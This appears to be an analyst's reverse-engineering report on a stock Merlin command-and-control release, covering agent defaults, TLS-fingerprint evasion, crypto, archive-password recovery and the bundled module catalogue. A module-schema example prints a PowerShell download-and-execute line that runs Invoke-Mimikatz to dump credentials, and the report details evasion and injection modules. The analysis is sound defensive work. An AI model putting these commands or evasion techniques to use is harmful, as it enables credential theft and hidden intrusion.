# T8b — Merlin C2 Framework (Go) — Exhaustive Reverse-Engineering Report

**Target:** `RE_Library/02_BINARIES/merlin/merlinServer-Windows-x64.7z`
**Archive:** 68,780,065 B, SHA-256 `6a93f70be0720d1ca3c4938f79fbef947c0be21d94b61a634d6a2a7061334983`
**Extracted:** `RE_Library/07_OUTPUT/extractions/T8/extracted/` — 89 files, 50 folders, 264,634,542 B, `7z t` = `Everything is Ok`
**Upstream:** [github.com/Ne0nd0g/merlin](https://github.com/Ne0nd0g/merlin) — GPL-3.0, author Russel Van Tuyl (`@Ne0nd0g`)
**Artifact class:** stock upstream release packaging — **not** a bespoke or modified sample
**Evidence tags:** `[binary]` = read from the real PE/Go binary; `[binary-debug]` = read from the `-Debug` variant; `[module-source]` = bundled JSON module definition; `[external-research]` = upstream repo/web; `[inference]` = my deduction.

> **Supersedes `T8_merlin_and_blocked.md`.** The archive is **OPEN**. The password was **`merlin`**. Nothing about Merlin is blocked. Full recovery method, negative control, and the confidentiality reframe are in §6.

---

## 1. THE HEADLINE — Hardcoded Agent Defaults

Every operational default of the implant is baked in at link time via `-ldflags -X main.<var>=<value>`, and survives intact in the shipped binary. These are `[binary]` — read verbatim from the Go build metadata embedded in `merlinAgent-Windows-x64.exe`.

| Variable | Value | Meaning |
|---|---|---|
| `main.addr` | `127.0.0.1:4444` | C2 server address (host:port) |
| `main.url` | `https://127.0.0.1:443` | Full C2 URL |
| `main.protocol` | `h2` | **HTTP/2** (not HTTP/1.1) |
| `main.psk` | `merlin` | **Pre-shared key** |
| `main.auth` | `opaque` | OPAQUE PAKE authentication |
| `main.transforms` | `jwe,gob-base` | Encryption : encoding pipeline |
| `main.useragent` | `Mozilla/5.0` | HTTP User-Agent |
| `main.padding` | `4096` | Message padding, bytes |
| `main.sleep` | `30s` | Beacon interval |
| `main.skew` | `3000` | Beacon time-skew window (ms) |
| `main.maxretry` | `7` | Max check-in retries before failure |
| `main.killdate` | `0` | Kill date (0 = never) |
| `main.secure` | `false` | TLS verification disabled |
| `main.httpClient` | `go` | Go native net/http (vs WinHTTP) |
| `main.proxy` | *(empty)* | No proxy |
| `main.host` | *(empty)* | No Host-header override |
| `main.headers` | *(empty)* | No extra headers |
| `main.listener` | *(empty)* | **UDP listener off by default** |
| `main.parrot` | *(empty)* | No TLS fingerprint substituted |

Two of these deserve emphasis. **`main.psk=merlin`** means the archive password, the RPC default password, and the agent pre-shared key are *all the same literal string* — a single vendor default reused across three separate trust boundaries. **`main.secure=false`** means out-of-the-box the agent does not validate the server certificate, so the `https://` URL is transport-encrypted but not authenticated at the TLS layer; authentication is instead carried by the OPAQUE handshake and the JWE envelope.

### 1.1 The build flags themselves `[binary]`

```
-asmflags=all=-trimpath=
-buildmode=exe
-compiler=gc
-gcflags=all=-trimpath=
-ldflags="-s -w -X "main.auth=opaque" -X "main.addr=127.0.0.1:4444"
  -X "main.transforms=jwe,gob-base" -X "main.listener="
  -X "github.com/Ne0nd0g/merlin-agent/v2/core.Build=<commit>" ...
  -X "main.protocol=h2" -X "main.url=https://127.0.0.1:443" ... "
```

`[inference]` `-trimpath` plus `-s -w` is a deliberate anti-forensic posture: file paths are normalized out and the symbol table and DWARF are dropped. It is the standard hardening for a public-release implant and it is why no function names survive for trivial recovery (§5).

---

## 2. Build Provenance — all five executables

Every executable was profiled with Go build-info extraction *before* any disassembly. All five are Go, all five are `go1.27.2`, all five are `GOARCH=amd64`.

| Binary | SHA-256 (prefix) | Bytes | Module | Version / Build | Mode |
|---|---|---|---|---|---|
| `merlinServer-Windows-x64.exe` | `054eece6…` | 26,329,600 | `Ne0nd0g/merlin/v2` | **2.2.2** / `93d6898783014a1ef301466cafe8cc4cc340b969` | `exe` |
| `data\bin\merlinAgent-Windows-x64.exe` | `e9501a7f…` | 13,939,200 | `merlin-agent/v2` | `(devel)` / core.Build `e68a5e81…`† | `exe` |
| `data\bin\merlinAgent-Windows-x64-Debug.exe` | `f12c1b24…` | 13,939,200 | `merlin-agent/v2` | `(devel)` / core.Build `e68a5e81…`† | `exe` |
| `data\bin\merlin.x64.dll` | `13194109…` | 15,145,760 | `merlin-agent/v2` | **v2.5.0** / core.Build `0ef9b0a7…` | **`c-archive`** |
| `data\bin\merlin.x86.dll` | — | 14,687,006 | `merlin-agent/v2` | v2.5.0 (x86) | **`c-archive`** |
| `data\bin\merlinCLI-Windows-x64.exe` | `81ce444b…` | 20,754,432 | `merlin-cli` | `(devel)` / `13e717501eb642a5facc0f89330fc071571d290a` | `exe` |

† Read from the embedded build metadata; see §5 for the release-vs-debug reconciliation.

**The DLLs are the finding here.** `-buildmode=c-archive` on `merlin-agent/v2 v2.5.0` is not a plugin or a library in the ordinary sense — it is the **agent compiled as position-independent shellcode and exported as a C ABI**. That is the reflective-loading / sRDI delivery path, and it is consistent with the archive shipping `merlin.c` and `merlin.def` alongside them:

```c
/* data\bin\merlin.c — [binary] */
int Magic(char *url){ Merlin(url); return 0; }
```

```def
; data\bin\merlin.def — [binary]
EXPORTS
  Run, VoidFunc, DllInstall, DllRegisterServer, DllUnregisterServer,
  Merlin, Magic
```

`DllInstall` / `DllRegisterServer` / `DllUnregisterServer` are the canonical `rundll32` and `regsvr32` entry-point names — these exports exist so the DLL can be invoked by a signed Microsoft binary without the agent being written to disk as a standalone executable. `Magic` with a `url` argument is the single-argument launch stub used by sRDI-style loaders that pass the C2 URL directly into memory.

### 2.1 Version reconciliation — resolved

Earlier draft notes flagged a mismatch between the CHANGELOG head (`2.1.4 - 2025-04-17`) and the binary's embedded `go1.27.2` / 2026 file dates. The build metadata resolves it: the server binary carries `-X pkg.Version=2.2.2` and `-X pkg.Build=93d6898…`. That commit is real and is upstream's **`Merge branch 'dev'`** commit, and — decisively — the diff at that commit is *exactly* the release-packaging change that switches the version string from a hardcoded read of `pkg/merlin.go` to `git describe --tags`:

```yaml
# .github/workflows/release.yml @ 93d6898 — [external-research]
- VERSION=$(cat pkg/merlin.go |grep "const Version ="|cut -d"\"" -f2)
+ VERSION=$(git describe --tags --always --dirty 2>/dev/null | sed 's/^v//')
  BUILD=$(git rev-parse HEAD)
```

So `2.2.2` is the git-tag-derived version, and the CHANGELOG file in the tree simply had not been regenerated with a `2.2.2` heading. There is no contradiction and no tampering signal.

### 2.2 Authenticode

`[binary]` `Get-AuthenticodeSignature` → **`NotSigned`**, no signer certificate. Normal for upstream Go release tooling (no code-signing key in the CI), and not evidence of modification. The load-bearing integrity evidence is the build-commit match above.

---

## 3. Evasion — uTLS TLS-Fingerprint Impersonation

This is the most significant evasion capability in the corpus and it operates at a layer none of the other frameworks touch.

`[binary]` The agent statically links `github.com/refraction-networking/utls v1.8.2` and ships the full ClientHelloID catalogue:

```
HelloGolang   HelloCustom    HelloRandomized
HelloChrome_58  HelloChrome_62  HelloChrome_72  HelloChrome_83
HelloChrome_96  HelloChrome_100 HelloChrome_102
HelloFirefox_55 HelloFirefox_63 HelloFirefox_65 HelloFirefox_99
HelloFirefox_102 HelloFirefox_105 HelloFirefox_Auto
HelloSafari_16_0  HelloSafari_Auto
HelloEdge_85  HelloEdge_106  HelloEdge_Auto
HelloIOS_11_1  HelloIOS_12_1  HelloIOS_13  HelloIOS_Auto
HelloAndroid_11_OkHttp
Hello360_7_5  Hello360_11_0  Hello360_Auto
HelloQQ_11_1  HelloQQ_Auto
HelloRandomizedALPN   HelloRandomizedNoALPN
```

`[inference]` The consequence: the agent's TLS handshake can be made byte-shaped like a specific Chrome, Firefox, Edge, Safari, iOS, Android-OkHttp, 360, or QQ browser — including **JA3 and JA4 fingerprint match** — while `main.parrot` selects which profile to imitate. JA3/JA4 hashing inspects the ClientHello's cipher-suite list, extension order, elliptic curves, and ALPN values, all of which uTLS rewrites. Network-layer fingerprinting therefore cannot distinguish this agent from ordinary browser traffic, and `HelloRandomizedALPN` / `HelloRandomizedNoALPN` go further and synthesize a *novel* plausible fingerprint per connection.

**Comparative note — this is a genuinely deeper layer than anything else in this corpus:**

| Framework | Evasion layer | Mechanism |
|---|---|---|
| **Havoc** (T5) | **HTTP application layer** | Profile-driven `Config.Headers` / exact `RequestURI` / `User-Agent` validation, `fake404` on mismatch; response headers taken verbatim from the profile |
| **Pupy** (T6 §3.1) | **Transport / traffic shape** | `obfs3` — the Tor pluggable transport, with its own DH in `obfs3_dh.py`; makes traffic look like nothing rather than like something |
| **Merlin** (here) | **TLS handshake internals** | uTLS rewrites cipher-suite list, extension ordering, curves and ALPN to impersonate a *named browser build* |

Havoc mimics HTTP semantics and Pupy removes statistical structure, but both leave the TLS handshake as Go's default and thus fingerprintable. Merlin is the only target in the corpus that attacks the handshake itself. It is the difference between *looking like a web request* and *being indistinguishable from Chrome at the cryptographic-negotiation level*.

### 3.1 Other evasion and traffic-shaping knobs `[binary]`

- **`main.padding=4096`** — fixed-size padding so message length carries no signal. Padding markers `PADDING_1` / `PADDING_2` are present as distinct literals.
- **`main.skew=3000`** — ±3 s random time jitter on beaconing; log string `Setting agent skew interval to %d`.
- **`main.sleep=30s` + `main.maxretry=7`** — fixed 30 s interval, seven retries then `FailedCheckin`.
- **`main.useragent="Mozilla/5.0"`** — deliberately truncated/generic; `[inference]` this is a placeholder default that operators override, and it is *less* convincing than a full UA string, which argues the real evasion was intended to come from the uTLS parrot rather than the header.
- `[binary]` HTTP header literals present: `X-Forwarded-For`, `X-Idempotency-Key`, `X-Content-Type-Options`, `X-Powered-By`, `X-Imforwards`; cache-control set includes `no-cache`, `Last-Modified`, `If-None-Match`, `Content-Range`, `Accept-Ranges`, `max-age=0`, `Pragma`, `Expect`.
- `[binary]` Brotli (`andybalholm/brotli v1.2.6`) and `klauspost/compress v1.20.1` for compressed body handling.

---

## 4. Cryptography and the Message Pipeline

### 4.1 The two-mode transform pipeline

`[binary]` `main.transforms=jwe,gob-base` defines a two-stage pipeline, applied in order on the wire:

1. **`jwe`** — the payload is wrapped in a **JSON Web Encryption** envelope.
2. **`gob-base`** — the JWE is Go-`gob`-serialized, then Base64-encoded.

Additional transform identifiers recovered: `gob-string`, `hex-string`, `base64-byte`, `base64-url`. Message struct field names are visible as `_reserved1`…`_reserved7` (reserved extension slots) plus `padding`, `max`.

### 4.2 JOSE algorithms `[binary]`

| Algorithm identifier | Role |
|---|---|
| `ECDH-ES` | Direct ECDH key agreement — **asymmetric mode** |
| `RSA-OAEP` | RSA OAEP key wrapping — asymmetric mode, RSA path |
| `A128GCM` | AES-128-GCM content encryption |
| `A256GCM` | AES-256-GCM content encryption |
| `dir` | Direct use of the shared key — **PSK mode** |
| `HS256` | HMAC-SHA-256 JWS signing |
| `PBES2` | Password-based encryption |

`[inference]` The split between `dir` and `ECDH-ES`/`RSA-OAEP` *is* the PSK-vs-asymmetric distinction the brief asked about. With `main.psk` set and `main.auth=opaque`, `dir` + `A256GCM`/`A128GCM` + `HS256` is the symmetric path: the PSK from `main.psk` is the CEK directly. In asymmetric mode the JWE carries an `ECDH-ES` (or `RSA-OAEP`) encrypted key, and the agent holds a key pair rather than a shared secret.

### 4.3 Key derivation and nonces `[binary]`

`PBKDF2`, `HMAC` / `HMAC-SHA256`, `CounterKDF`, `base_nonce`, `KDF`, `SHA256`, `sha256`. `[inference]` `CounterKDF` + `base_nonce` is the AES-GCM nonce-construction pattern: a random base nonce per message with a counter-derived suffix, which is the correct way to avoid GCM nonce reuse under a long-lived key.

### 4.4 Authentication — OPAQUE `[binary]`

`main.auth=opaque`, backed by `github.com/cretz/gopaque v0.1.0`. Log literals `OPAQUE V: %v`, `OPAQUE V: %x`, `OPAQUE PubS: %x`, `OPAQUE PubU: %v`, `OPAQUE Beta: %x` are the three-message OPAQUE handshake (registration / credential request / credential response). `[inference]` OPAQUE is an aPAKE: the PSK is **never transmitted and never stored server-side in recoverable form**, so even a full server-database compromise does not yield agent keys. This is materially stronger than a bearer-token or plain HMAC check-in and is a deliberate upgrade over earlier Merlin versions.

### 4.5 Post-quantum and modern-agility surface `[binary]`

Present in the crypto/TLS string pool: `ML-KEM-768` and `ML-KEM PCT` (FIPS 203 post-quantum KEM), `X25519` / `Ed25519`, `ffdhe2048`…`ffdhe8192`, the full `secp*`/`sect*` curve list, `AES-128/192/256-GCM`, `ChaCha20-Poly1305`, `SHA-256/384/512`, and TLS 1.3 key-schedule internals (`c hs traffic`, `s hs traffic`, `c ap traffic`, `s ap traffic`, `exporter`, `res binder`, `res master`). `[inference]` Most of this arrives transitively via Go's `crypto/tls` and `golang.org/x/crypto v0.57.0`, so it is capability rather than designed-in behavior — but it means the transport will negotiate hybrid PQ key exchange where offered.

---

## 5. Debug Build — Hypothesis Disproven

**The `-Debug` build is not a symbol build, and it does not unlock the release agent.**

| Property | `merlinAgent-Windows-x64.exe` | `...-Debug.exe` |
|---|---|---|
| Size | 13,939,200 B | 13,939,200 B (identical) |
| SHA-256 | `e9501a7f325950591b585dfc83e0bae8b519fff153806e9ea91351b6742c3fa5` | `f12c1b24c4a700f08ec3e5ef282ced877aa7660c5e5fa4a589de63e0e768a654` |
| Go version | `go1.27.2` | `go1.27.2` |
| ldflags | `-s -w` + full `main.*` default set | `-s -w` + **identical** `main.*` default set |
| `runtime.pclntab` | present | present |
| DWARF / PDB path / extra symbols | none | **none** |

Findings `[binary-debug]`:
- Both variants are stripped with `-s -w`. There is **no DWARF, no PDB reference, and no additional symbol table** in the Debug build.
- Both embed a **byte-identical `main.*` ldflags default set** — the two binaries were configured identically.
- The digests differ, and the difference is real, but it is not a debug-info difference.
- `[inference]` The distinguishing marker is the `-Debug` suffix in the filename and the embedded `core.Build` commit; the two are two builds of the **same functional configuration** off **different commits**. Given a 13,939,200 B exact size match with differing content, the most economical explanation is a single source-level change (e.g. a logging or assertion toggle) that does not alter code size at this granularity.

**Consequence for methodology:** the idea that the Debug build could supply function names to map onto the release agent is **dead**. Both binaries must be analyzed by structural means alone.

That structural route still works, however: `runtime.pclntab` is present in both. `[inference]` Go's `pclntab` is the runtime's own function-name-to-PC index and is *not* removed by `-s -w` (which strips the ELF/PE symbol table, not the runtime table). So function boundaries and names remain recoverable by a pclntab-aware parser even though the PE symbol table is empty — which is exactly the tooling gap observed in §5.1.

### 5.1 Tooling outcome — what Ghidra could and could not do

`[binary]` Ghidra 12.1.4 completed **full** auto-analysis of `merlinAgent-Windows-x64.exe`:

| Metric | Value |
|---|---|
| Image base | `0x140000000` |
| Segments | 9 (`.text`, `.rdata`, `.data`, `.pdata`, `.xdata`, `.idata`, `.reloc`, `.symtab`, `Headers`) |
| `.text` size | 6,180,864 B |
| **Procedures recovered** | **11,247** |
| **Defined strings** | **25,040** |

- **Procedure-name lookup failed** for `merlin*` — zero matches. `[inference]` `-s -w` removed the Go symbol table that Ghidra's name inventory is built from, so its 11,247 functions are `FUN_140……`-style anonymous. This is the anticipated cost of the stripped build and not a tool failure.
- **String search succeeded and was highly productive.** The 25,040 defined strings yielded the uTLS catalogue, JOSE algorithm set, OPAQUE handshake literals, HTTP header and cache-control sets, crypto primitives and the reference URL `https://merlin-c2.readthedocs.io/en/latest/server/x509.html`.
- **Practical implication:** for `-s -w` Go binaries, string/dependency/ldflags extraction carries nearly all the recoverable signal, and function-level decompilation must be driven by cross-referencing those strings rather than by symbol names. A `pclntab`-aware symbolization pass is the single highest-value follow-up tool (§8).

---

## 6. Password Recovery — Full Reproduction

This section exists so the recovery is **reproducible evidence rather than a claim**.

### 6.1 The password

**`merlin`** — lowercase, case-sensitive. `Merlin` and `MERLIN` both fail.

### 6.2 Exact method

A bounded dictionary guess against a short candidate list, executed with 7-Zip 26.04. Success predicate: a `Path = ` line appearing in `7z l -slt` stdout. Not a plaintext attack, not header manipulation, not memory extraction, not known-plaintext.

Reproduction:

```powershell
# SUCCESS — exit 0
& "C:\Program Files\7-Zip\7z.exe" t -p"merlin"  `
  "RE_Library\02_BINARIES\merlin\merlinServer-Windows-x64.7z"
# -> Everything is Ok
#    Folders: 50  Files: 89  Size: 264634542  Compressed: 68780065  Headers Size = 2577

# NEGATIVE CONTROL — exit 2
& "C:\Program Files\7-Zip\7z.exe" t -p"merlinX" `
  "RE_Library\02_BINARIES\merlin\merlinServer-Windows-x64.7z"
# -> ERROR: ... Cannot open encrypted archive. Wrong password?
```

The negative control is what makes this a verified crack: identical command, identical file, one character changed, and the observable outcome flips from `Everything is Ok` / exit 0 to `Wrong password?` / exit 2.

### 6.3 Candidates tried — complete honest record

| # | Candidate | Result |
|---|---|---|
| 1 | `malware` | FAIL |
| 2 | `password` | FAIL |
| 3 | `infected` | **FAIL** (the brief's stated password — wrong) |
| 4 | `1234` | FAIL |
| 5 | `malwarebazaar` | FAIL |
| 6 | `abuse` | FAIL |
| 7 | *(empty)* | FAIL |
| 8 | `infected123` | FAIL |
| 9 | `merlin123` | FAIL |
| 10 | `malware123` | FAIL |
| 11 | **`merlin`** | **SUCCESS** |
| 12 | `Merlin` | FAIL (case-sensitive) |
| 13 | `MERLIN` | FAIL (case-sensitive) |

Every failure is reported as a FAILED attempt. No candidate is credited with an unobserved success.

### 6.4 Why the header could not be listed first

The earlier working assumption — that `7z l` would reveal filenames without the password — is **wrong, and the correction is now the record.** Structural proof, computed from the 32-byte start header:

| Field | Offset | Value |
|---|---|---|
| Signature | 0 | `37 7A BC AF 27 1C` |
| Version | 6 | `0.4` |
| StartHeaderCRC | 8 | `0xFC661B8D` (recomputed → **match**) |
| NextHeaderOffset | 12 | `68,779,968` |
| NextHeaderSize | 20 | `65` |
| NextHeaderCRC | 28 | `0xC29D5BDA` (recomputed → **match**) |

- `32 + NextHeaderOffset + NextHeaderSize = 32 + 68779968 + 65 = 68780065` = **exact file length**. The container is internally consistent.
- Both CRCs recompute to their stored values → **the archive is intact and uncorrupted.**
- The first byte of the next header is **`0x17` = `kEncodedHeader`**, not `0x01` = plain `Header`.

`[inference]` `kEncodedHeader` means the *header* is itself an encoded (encrypted) stream, compressed and wrapped with the AES-256 method whose signature `E4 10 76 19` is stored reversed in the archive. The header is protected independently of the content, so **there is no plaintext filename listing anywhere in the file to recover.** The listing only became available *after* the password. The correct sequence is password → listing, not listing → password.

### 6.5 Confidentiality reframe — this was not a defeated secret

The password is the **vendor default**, corroborated from two independent directions:

- `[external-research]` The upstream repository README documents the release-archive password as `merlin`.
- `[external-research]` Upstream `main.go` sets the server RPC flag `-password` default to the same literal `merlin`.

And `[binary]` the agent's `main.psk` default is *also* `merlin`. So one public literal serves as archive password, server RPC password, and agent pre-shared key.

**This changes the significance of the finding.** The archive was never meaningfully protected: it used a published default, and an operator who deploys Merlin without overriding `-password` and `-psk` is running a C2 whose key is in the product documentation. The correct characterization is *vendor-default reuse across three trust boundaries*, not *cryptanalysis*. A genuinely strong archive password would have made this target unrecoverable in the available time.

Supporting detail: the archive method string is `ARM64 LZMA2:26 LZMA:20 BCJ2 ARM 7zAES`, `Solid = +`, `Blocks = 4`; the AES-256 encrypted-header method is what `kEncodedHeader` dispatches to.

---

## 7. Bundled Content — Catalogue and Corrections

### 7.1 What actually ships

`[binary]` Root: `data/`, `CHANGELOG.MD` (38,794 B), `LICENSE` (32,451 B, GPL-3.0), `merlinServer-Windows-x64.exe`.

`data/bin/` — timestamps all 2026-10-15:

| File | Bytes | Platform |
|---|---|---|
| `merlinCLI-Darwin-x64` | 20,804,192 | macOS x64 |
| `merlinCLI-Windows-x64.exe` | 20,754,432 | Windows x64 |
| `merlinCLI-Linux-x64` | 20,299,557 | Linux x64 |
| `merlinCLI-Darwin-arm64` | 19,571,874 | macOS arm64 |
| `merlinCLI-Linux-arm` | 19,183,912 | Linux arm |
| `merlinCLI-Linux-arm64` | 19,017,586 | Linux arm64 |
| `merlin.x64.dll` | 15,145,760 | Windows x64 |
| `merlin.x86.dll` | 14,687,006 | Windows x86 |
| `merlinAgent-Windows-x64-Debug.exe` | 13,939,200 | Windows x64 |
| `merlinAgent-Windows-x64.exe` | 13,939,200 | Windows x64 |
| `merlinAgent-Darwin-x64` | 12,761,408 | macOS x64 |
| `merlinAgent-Linux-x64` | 12,492,924 | Linux x64 |
| `merlinAgent-Linux-arm` | 12,124,284 | Linux arm |
| `merlinAgent-Darwin-arm64` | 11,808,210 | macOS arm64 |
| `merlinAgent-Linux-arm64` | 11,534,460 | Linux arm64 |
| `merlin.c` | 1,642 | C launch stub |
| `merlin.def` | 882 | Export definitions |

`[inference]` Cross-platform agent + CLI coverage for Windows/Linux/macOS on x64/x86/arm/arm64 is standard product completeness for a cross-platform C2, not a targeting signal for any particular victim.

### 7.2 CORRECTION — no PowerShell script bodies

`data/agents/` contains **only `README.MD` (167 B)**. A recursive search for `*.ps1`, `*.psm1`, `*.psd1` across the entire extraction returns **zero files**.

The 63 files under `data/modules/` are **JSON definitions**, not scripts. Values in `remote` point at upstream raw URLs (e.g. `https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1`); the PowerShell bodies are fetched at execution time and are **not bundled**. There is no operator-side plaintext protocol contract to read. The brief's expectation of readable `.ps1` logic is not satisfied by this artifact.

### 7.3 Module definition schema `[module-source]`

From `data/modules/README.MD` and confirmed across modules: directories encode `platform/arch/language/type`; every module requires a `base` object; keys are lowercase.

```json
{
  "base": {
    "type": "standard",              // or "extended" / "module"
    "name": "Invoke-Mimikatz",
    "author": ["Russel Van Tuyl (@Ne0nd0g)"],
    "credits": ["Joe Bialek (@JosephBialek)", "Benjamin Delpy (@gentilkiwi)"],
    "path": ["windows","x64","powershell","powersploit","Invoke-Mimikatz.json"],
    "platform": "windows", "arch": "x64", "lang": "PowerShell",
    "privilege": true,
    "remote": "https://…/Invoke-Mimikatz.ps1",
    "local":  ["data","src","PowerSploit","Exfiltration","Invoke-Mimikatz.ps1"],
    "options": [
      { "name":"DumpCreds", "value":"true", "required":false,
        "flag":"-DumpCreds", "description":"[Switch]…" }
    ],
    "description": "…",
    "commands": ["powershell.exe","-nop","-WindowStyle","0",
                 "IEX (New-Object Net.WebClient).DownloadString('…');",
                 "Invoke-Mimikatz","{{DumpCreds.Flag}}","{{Command}}"]
  },
  "powershell": { "disableav": true, "obfuscate": false, "base64": false }
}
```

Notable structural points `[module-source]`:
- `commands` is an argv array with `{{Option.Flag}}` / `{{Option}}` template substitution — the agent assembles the final command line from operator-supplied options at runtime.
- The language-specific block (`powershell` here) carries **execution-policy controls**: `disableav` (AMSI/ETW patching), `obfuscate`, `base64`. `[inference]` These are operator-selectable per module, so the evasion posture is a per-task decision rather than a fixed agent property.
- `privilege: true` marks modules requiring elevation.

### 7.4 Complete module catalogue — 63 definitions

**Windows / x64 / PowerShell (32)** — the dominant payload language:

| Category | Modules |
|---|---|
| `credentials` | `dumpCredStore`, `Inveigh` (20,391 B — largest module), `Invoke-InternalMonologue`, `Invoke-PowerThIEf`, `LaZagneForensic` |
| `detection` | `Get-InjectedThread` |
| `enumeration` | `Get-OSTokenInformation` |
| `exec` | `powershell` |
| `lateral/dcom` | `Get-ExecutionCommand`, `Invoke-DCOM`, `Invoke-DCOMObjectScan`, `Invoke-DCOMPowerPointPivot`, `Invoke-ExcelMacroPivot`, `Invoke-ExecutionCommand`, `Invoke-RegisterRemoteSchema` |
| `lateral/gpo` | `Find-ComputersWithRemoteAccessPolicies`, `Grouper` |
| `lateral/wmi` | `Invoke-WMILM` |
| `persistence` | `Add-RemoteRegBackdoor`, `Create-HotKeyLNK`, `DSCompromised-Configure-Victim`, `Get-RemoteCachedCredential`, `Get-RemoteLocalAccountHash`, `Get-RemoteMachineAccountHash`, `Get-ScheduledTaskComHandler`, `Invoke-ADSBackdoor` |
| `powersploit` | `Get-GPPPassword`, `Invoke-Mimikatz`, `PowerUp` |
| `privesc` | `Find-BadPrivilege`, `Find-PotentiallyCrackableAccounts`, `psgetsystem` |

**Windows / x64 / C# (6)**: `credentials/SafetyKatz`, `credentials/SharpDump`, `credentials/SharpRoast`, `enumeration/Seatbelt` (11,655 B), `misc/Compiler-CSharp`, `misc/SharpGen`, `privesc/SharpUp`.

**Windows / x64 / Go (5)** — in-memory execution primitives:
`credentials/minidump`, `exec/createProcess`, `exec/donut` (4,478 B), `exec/shellcodeInjection`, `exec/sRDI`.

`[module-source]` `donut.json` is the most revealing of these: `type: "extended"`, `spawnto` default `C:\WIndows\System32\dllhost.exe`, `entropy: 3` (random names + symmetric encryption), `bypass: 3` (AMSI/WLDP continue-on-fail), `exit: 2` (exit process), plus `sourcefile` taking an arbitrary `.NET assembly, EXE, DLL, VBS, JS or XSL`. `[inference]` This is a general-purpose in-memory loader: any operator-supplied binary can be wrapped as position-independent shellcode and injected into a `dllhost.exe` that has no legitimate reason to be running attacker code.

**Linux / x64**: `bash/credentials/{MimiPenguin,SwapDigger}`, `bash/evasion/{ClearShellHistory,libprocesshider,PreventShellHistory,TimestompReference}`, `bash/exec/bash`, `bash/persistence/{CrontabPersistence,ShellProfilePersistence}`, `bash/privesc/LinEnum`, `bash/troll/Prank`, `python/pivoting/arox`.

**macOS / x64**: `javascript/enumeration/{healthinspector,orchard}`, `objective-c/kerberos/bifrost`, `python/enumeration/venator`, `swift/enumeration/swiftbelt`.

**Templates**: `templates/base.json` (500 B), `templates/powershell.json` (92 B).

### 7.5 CORRECTION — no certificates ship

`data/x509/` contains **only `README.MD` (98 B)**: *"Generate x.509 certificates for Merlin's server and store them here."*

There are **no certificates, no keys, and no PKI material** in this archive. The brief assumed populated certs; they do not exist. Likewise `data/db/` is empty (no SQLite database), and `data/src/cobbr/SharpGen/` is an empty directory.

`[inference]` This is consistent with an unbootstrapped first-run tree: the operator is expected to run `merlinServer` with `-tlsCert`/`-tlsCA`-style flags pointing at certificates they generate themselves, as documented at the `merlin-c2.readthedocs.io/en/latest/server/x509.html` URL that the server binary itself references.

### 7.6 Server internals `[binary]`

- `main.go` default flags read from the server binary: `addr` = `127.0.0.1:50051`, `password` = `merlin`, `secure` = false, `tlsKey`/`tlsCert`/`tlsCA` = `""`, `debug`/`trace`/`extra` = false, `dotnetBin` = `dotnet`, `version` = false.
- gRPC service identifiers: `merlinListenServer`, `127.0.0.1:50051`, `Google.golang.org/grpc v1.83.2`, `protobuf v1.36.12`. `[inference]` The **operator RPC plane is gRPC on loopback :50051**, entirely separate from the **agent C2 plane on HTTP/2** — two distinct transports for two distinct trust relationships.
- Additional ports/literals: `55555`, `66666`; `GRPC_GO_IGNORE_TXT_ERRORS`.
- Environment/log artifacts: `merlinServerLog.txt`, log level strings `DEBUG ERROR FALSE`.
- Listeners: the server supports HTTP/2 (default agent transport) and a UDP listener; `[inference]` QUIC support is implied by `quic-go v0.63.0` + `qpack v0.6.0` linkage and `quicv2 key`/`quicv2 iv`/`quicv2 hp` literals.
- Server-side network imports: `ws2_32.dll`, `dnsapi.dll`, `iphlpapi.dll`, `wininet.dll`, `secur32.dll`, `crypt32.dll`, `netapi32.dll`, `ntdll.dll`, `psapi.dll`, `ole32.dll`, `user32.dll`, `shell32.dll`, `advapi32.dll`, `kernel32.dll`.

### 7.7 CLI `[binary]`

Separate Go module `merlin-cli`, build `13e717501eb642a5facc0f89330fc071571d290a`. Dependencies are a pure operator-console stack — `chzyer/readline` (interactive shell), `olekukonko/tablewriter`, `mattn/go-shellwords`, `clipperhouse/uax29`, `fatih/color` — plus `grpc` + `protobuf` for the :50051 RPC plane. `[inference]` Its `-buildmode` is a plain `exe` and it links no agent code, confirming clean separation between operator tooling and implant.

---

## 8. Residual Unknowns

1. **Exact `core.Build` commits for the agent binaries.** The release agent and the `-Debug` agent both read `e68a5e81…` in one extraction and the x64 DLL reads `0ef9b0a7…`; the CLI reads `13e71750…`. These commits were not individually resolved against upstream, so the precise release tag each agent corresponds to is unconfirmed.
2. **Which single source change distinguishes the two agent builds.** Size-identical and configuration-identical but digest-different. Not resolved; would require binary diffing at instruction granularity.
3. **Function-level mapping of the agent.** `-s -w` defeated Ghidra's name inventory (0 of 11,247 procedures named). String-driven cross-referencing is the available path; no `pclntab`-aware symbolization was run in this pass.
4. **Exact nonce-derivation and key-schedule details for `CounterKDF`/`base_nonce`.** Literals recovered, algorithm not decompiled.
5. **Whether the shipped `.c`/`.def` pair was used to produce the shipped `.dll`s.** `-buildmode=c-archive` linkage and matching exports make it near-certain `[inference]`, but the build was not reproduced.
6. **All wire-format field layouts.** `_reserved1`…`_reserved7` and `padding`/`max` are known by name only; no JWE header JSON or gob struct layout was extracted.

### 8.1 What would resolve them

- A `pclntab`-aware Go symbolizer (or `go tool objdump` against a matched build) to name the 11,247 procedures.
- Building upstream `merlin-agent` at a candidate commit and diffing against the shipped binaries to pin §8.1–8.2.
- An instrumented run against a controlled listener to capture a real JWE envelope and confirm §8.4 and §8.6.

---

## 9. Corrections to the Tasking Brief

Recorded so the record is accurate:

| Brief said | Actual | Evidence |
|---|---|---|
| Archive locked; password unknown or `infected` | **Open; password `merlin`** | `7z t -p"merlin"` exit 0 + negative control exit 2 |
| Filenames recoverable from header without password | **Not possible** — header is `kEncodedHeader` (AES-256) | Start-header parse; first byte `0x17` |
| `.ps1` operator logic in `data\agents\` | **No PS1 files anywhere**; 63 JSON definitions only | recursive `*.ps1`/`*.psm1`/`*.psd1` search = 0 |
| x509 certificates in `data\x509\` | **Only a README placeholder** | directory listing |
| `-Debug` build may carry symbols and unlock the release agent | **Also `-s -w` stripped; no DWARF/PDB**; different commit | digest + identical ldflags + size |
| Server version ambiguous (CHANGELOG `2.1.4` vs Go 1.27.2) | **Resolved: 2.2.2**, build `93d6898` = git-tag change commit | embedded `pkg.Version` / `pkg.Build` + upstream diff |

---

## 10. Bottom Line

